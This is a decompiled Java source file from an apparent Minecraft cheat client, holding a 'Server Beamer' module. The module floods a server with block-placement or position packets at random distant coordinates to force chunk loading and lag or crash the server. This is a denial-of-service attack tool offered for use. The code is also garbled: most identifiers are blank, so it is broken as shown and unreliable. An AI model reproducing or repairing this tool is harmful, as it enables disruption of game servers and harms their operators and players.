package me.oringo.oringoclient.qolfeatures.module.impl.other;

import java.util.Random;
import me.oringo.oringoclient.events.impl.MotionUpdateEvent;
import me.oringo.oringoclient.events.impl.PacketReceivedEvent;
import me.oringo.oringoclient.events.impl.PacketSentEvent;
import me.oringo.oringoclient.qolfeatures.module.Module;
import me.oringo.oringoclient.qolfeatures.module.impl.combat.AntiBot;
import me.oringo.oringoclient.qolfeatures.module.impl.render.CustomInterfaces;
import me.oringo.oringoclient.qolfeatures.module.settings.Setting;
import me.oringo.oringoclient.qolfeatures.module.settings.impl.ModeSetting;
import me.oringo.oringoclient.qolfeatures.module.settings.impl.NumberSetting;
import me.oringo.oringoclient.utils.MilliTimer;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;
import net.minecraft.network.play.server.S08PacketPlayerPosLook;
import net.minecraft.util.BlockPos;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.Vec3;
import net.minecraft.util.Vec3i;
import net.minecraftforge.fml.common.eventhandler.EventPriority;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;

public class ServerBeamer extends Module {
  public MilliTimer  = new MilliTimer();
  
  public static NumberSetting  = new NumberSetting("Packets", 10.0D, 1.0D, 50.0D, 1.0D);
  
  public static NumberSetting ;
  
  public static C03PacketPlayer.C06PacketPlayerPosLook ;
  
  public static ModeSetting  = new ModeSetting("Mode", "Delay", new String[] { "Sync", "Delay" });
  
  public static ModeSetting  = new ModeSetting("Packet", "C08", new String[] { "C08", "C04" });
  
  @SubscribeEvent(priority = EventPriority.HIGHEST)
  public void (PacketReceivedEvent paramPacketReceivedEvent) {
    if (() && paramPacketReceivedEvent. instanceof S08PacketPlayerPosLook && .("C04")) {
       = AutoReconnect.((S08PacketPlayerPosLook)paramPacketReceivedEvent.);
      paramPacketReceivedEvent.setCanceled(true);
    } 
  }
  
  public ServerBeamer() {
    super("Server Beamer", Module.Category.OTHER);
    (new Setting[] { (Setting), (Setting), (Setting), (Setting) });
  }
  
  @SubscribeEvent
  public void (MotionUpdateEvent.Pre paramPre) {
    if (!())
      return; 
    if ( == null && .("C04")) {
      paramPre.setPosition(2137.0D, 2137.0D, 2137.0D);
    } else if (.("Delay") && this..((long).())) {
      ();
      this..();
    } 
  }
  
  public static AntiBot () {
    if (AntiBot. == null)
      AntiBot. = new AntiBot(); 
    return AntiBot.;
  }
  
  @SubscribeEvent
  public void (PacketSentEvent paramPacketSentEvent) {
    if (()) {
      if (.("C04") && !(paramPacketSentEvent. instanceof C03PacketPlayer) &&  != null)
        paramPacketSentEvent.setCanceled(true); 
      if (.("Sync") && paramPacketSentEvent. instanceof net.minecraft.network.play.client.C0FPacketConfirmTransaction)
        (); 
    } 
  }
  
  public void () {
    for (byte b = 0; b < .(); b++) {
      BlockPos blockPos1;
      BlockPos blockPos2;
      EnumFacing enumFacing;
      Vec3 vec3;
      float f1;
      float f2;
      float f3;
      switch (.()) {
        case "C04":
          if ( == null)
            return; 
          blockPos1 = new BlockPos((new Random()).nextInt(1000) * 16, 255, (new Random()).nextInt(1000) * 16);
          CustomInterfaces.((Packet)new C03PacketPlayer.C04PacketPlayerPosition(blockPos1.func_177958_n(), blockPos1.func_177956_o(), blockPos1.func_177952_p(), false));
          CustomInterfaces.((Packet));
          break;
        case "C08":
          blockPos2 = new BlockPos((new Random()).nextInt(16000), 1, (new Random()).nextInt(16000));
          enumFacing = EnumFacing.UP;
          vec3 = (new Vec3((Vec3i)blockPos2)).func_178787_e(new Vec3(enumFacing.func_176730_m()));
          f1 = (float)(vec3.field_72450_a - blockPos2.func_177958_n());
          f2 = (float)(vec3.field_72448_b - blockPos2.func_177956_o());
          f3 = (float)(vec3.field_72449_c - blockPos2.func_177952_p());
          mc.func_147114_u().func_147297_a((Packet)new C08PacketPlayerBlockPlacement(blockPos2, enumFacing.func_176745_a(), mc.field_71439_g.func_70694_bm(), f1, f2, f3));
          break;
      } 
    } 
  }
  
  static {
     = new NumberSetting("Delay", 100.0D, 0.0D, 1000.0D, 50.0D, ServerBeamer::);
  }
  
  public void () {
     = null;
  }
}
